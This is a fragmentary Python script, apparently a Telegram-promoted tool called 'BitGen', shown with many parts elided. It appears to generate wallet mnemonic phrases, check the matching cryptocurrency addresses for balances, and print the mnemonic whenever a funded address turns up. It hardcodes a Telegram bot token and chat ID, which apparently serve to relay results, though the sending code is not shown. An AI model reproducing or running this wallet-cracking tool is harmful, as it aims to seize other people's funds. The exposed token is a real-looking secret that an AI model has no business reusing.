...
token_bot = "1854335725:AAEws3L0eV1HHsqXJQpzqo3I2HVEdFtzjMc" # создать бота и получить токен тут @BotFather
chat_id = "1708511598" #узнать ваш id можно в боте @userinfobot
...
def userInput():
    ...
    print("BitGen by congrammer for https://t.me/joinchat/OuOfcRbMOKUxZDhk ")
    time.sleep(2)
                ...
                if balance > 0:
                    ...
                    if(received > 0):
                        ...
                        if colortmp == 1:
                            ...
                            colortmp = 1
                            print('{}Balance: {} | Received: {} | Address: {} | Mnemonic phrase: {}{}'.format(fg("#000000")+bg("#cccccc"), balance, received, addy, mnemonic_words, attr("reset")))
...
Modified by congrammer && @anonymousl337 telegram
for channel https://t.me/joinchat/OuOfcRbMOKUxZDhk 
